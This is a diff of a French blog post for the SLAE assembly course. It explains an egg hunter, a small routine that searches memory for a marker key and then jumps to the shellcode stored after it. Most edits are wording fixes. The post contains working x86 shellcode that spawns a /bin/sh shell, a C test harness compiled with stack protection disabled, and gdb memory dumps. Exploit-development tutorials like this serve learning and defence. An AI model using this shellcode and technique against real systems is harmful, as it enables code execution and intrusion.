@@ -6,12 +6,14 @@ Afin d'améliorer les chances de le trouver, il peut être conseillé de multipl
 
 ## Définition de la clé ##
 
-Nous allons pour cela utiliser la clé "b33fb33f".
+Nous allons pour cela utiliser la clé "b33fb33f". Ce choix est arbitraire, c'est un pattern facilement identifiable et qui a très peu de chance d'exister hors de ce contexte.
 
-Le egg hunter va parcourir la mémoire à la recherche de la clé précédement définie. Lors qu'il va essayer d'accéder à une zone mémoire non mappée cela va causer une erreur syst§me (SIGSEV). Il est donc necessaire de connaître une adresse accessible dans le même segment pour le shellcode et la clé.
+Le programme Egg hunter va parcourir la mémoire à la recherche de la clé précédement définie. Lors qu'il va essayer d'accéder à une zone mémoire non mappée cela va causer une erreur syst§me (SIGSEV). Il est donc necessaire de connaître une adresse accessible dans le même segment pour le shellcode et la clé.
+
+L'idée est présentée via le descirptif ci-dessous.
 
 ```c
-[egg hunter][random memory][egg][egg][shellcode]
+[egg hunter][random memory][egg][shellcode]
 ````
 
 Nous allons pour cela créer un EggHunter qui aura pour fonction de chercher dans la mémoire la clé. Il faut pour cela s'assurer d'être dans le bon segment.
@@ -68,7 +70,7 @@ unsigned char egg[] = \
 "\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";
 
 unsigned char shellcode[] = \
-"\xb3\x3f\xb3\x3f"
+"\xb3\x3f\xb3\x3f" // EggKey
 "\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
 int main()
@@ -89,9 +91,9 @@ gcc -fno-stack-protector -z execstack test_egg.c -o test_egg
 Nous testons le tout :
 
 ```c
-phidia@xophidia-VirtualBox:~/Documents/Shellcode/as3$ ./test_egg 
+phidia@xophidia-VirtualBox:~/Documents/Shellcode/as3$ ./eggHunter_test
 Taille de l'Egg Hhunter 20
-Adresse du Shellcode:0x804a060
+Adresse du Shellcode: 0x804a060
 $ 
 ```
 
@@ -103,7 +105,7 @@ Nous voyons l'adresse obtenue lors du pop eax. Elle est valide et servira de poi
 Une fois la clé trouvée, nous effectuons un saut à cette adresse soit le début du shellcode.
 
 ```c
-EAX: 0x8048074 --> 0x0           ; adress valid from jum pop call technique
+EAX: 0x8048074 --> 0x0           ; valid address from jump pop call technique
 EBX: 0x3fb33fb3                  ; Egg key
 ECX: 0x0 
 EDX: 0x0 
@@ -124,7 +126,7 @@ EIP: 0x8048068 (<_>:	inc    eax) ; loop while the key is not found
    0x804806f <valid>:	call   0x8048062 <validAddress>
 
 
-Nous observons dans la pile la clé dans egg et au début du shellcode.
+Nous observons dans la pile la clé dans egg ainsi qu'au début du shellcode.
 
 gdb-peda$ x/20x 0x804a040
 0x804a040 <egg>:	0xbb580deb	0x3fb33fb3	0x75183940	0xe8e0fffb
@@ -139,4 +141,4 @@ This blog post has been created for completing the requirements of the SecurityT
 
 http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 
-Student ID: 
+StudentID - SLAE-3763
